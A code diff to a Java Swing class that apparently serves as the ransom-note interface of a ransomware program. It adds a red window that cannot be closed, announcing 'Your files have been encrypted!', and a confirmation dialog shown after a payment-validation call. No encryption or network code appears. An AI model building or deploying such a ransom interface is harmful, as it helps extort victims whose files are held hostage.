@@ -10,6 +10,7 @@ import java.io.InputStreamReader;
 public class launcher{
     private JFrame frame;
     private JPanel panel;
+    private JLabel label;
 
     //Data Encapsulation
     public void launcher(){
@@ -26,6 +27,13 @@ public class launcher{
 
         frame.setDefaultCloseOperation(frame.DO_NOTHING_ON_CLOSE);
         frame.setSize(1980, 1080);
+        frame.getContentPane().setBackground(Color.RED);
+
+        JPanel panel2 = new JPanel();
+        label = new JLabel("<html><h1>Opps! Your files have been encrypted!</h1></html>");
+        label.setForeground(Color.BLACK);
+        panel2.add(label);
+
         JMenuBar mb = new JMenuBar();
         JMenu m1 = new JMenu("Options");
         JMenu m2 = new JMenu("Help");
@@ -50,19 +58,20 @@ public class launcher{
         m12.addActionListener(new CloseListener());
         m21.addActionListener(new HelpListener());
 
-
         // Customizing the buttons
         button1.setFont(new Font("Serif", Font.ITALIC, 30));
         button2.setFont(new Font("Serif", Font.ITALIC, 30));
 
         // Create a new panel
         panel = new JPanel();
+        panel.setBackground(Color.RED);
 
         //Add them to panel
         panel.add(button1);
         panel.add(button2);
 
         frame.add(BorderLayout.NORTH,mb);
+        frame.add(BorderLayout.NORTH,panel2);
         frame.add(BorderLayout.SOUTH,panel);
         frame.setVisible(true);
     }
@@ -116,6 +125,26 @@ class DecryptListener implements ActionListener{
         try{
             decrypt dec = new decrypt();
             dec.validatePayment();
+            JFrame frame3 = new JFrame("Decrypton Done!");
+            frame3.getContentPane().setBackground(Color.GREEN);
+            frame3.setDefaultCloseOperation(frame3.DISPOSE_ON_CLOSE);
+            JLabel label3 = new JLabel("File have been decrypted!",SwingConstants.CENTER);
+            label3.setForeground(Color.RED);
+            frame3.setSize(500,200);
+            JButton button4 = new JButton("close");
+            JPanel panel = new JPanel();
+            panel.setBackground(Color.GREEN);
+            panel.add(button4);
+            ActionListener closeFrame3 = new ActionListener(){
+                @Override
+                public void actionPerformed(ActionEvent e){
+                    frame3.dispose();
+                }
+            };
+            button4.addActionListener(closeFrame3);
+            frame3.add(BorderLayout.CENTER,label3);
+            frame3.add(BorderLayout.SOUTH,panel);
+            frame3.setVisible(true);
         }
         catch (Exception err){
             err.printStackTrace();
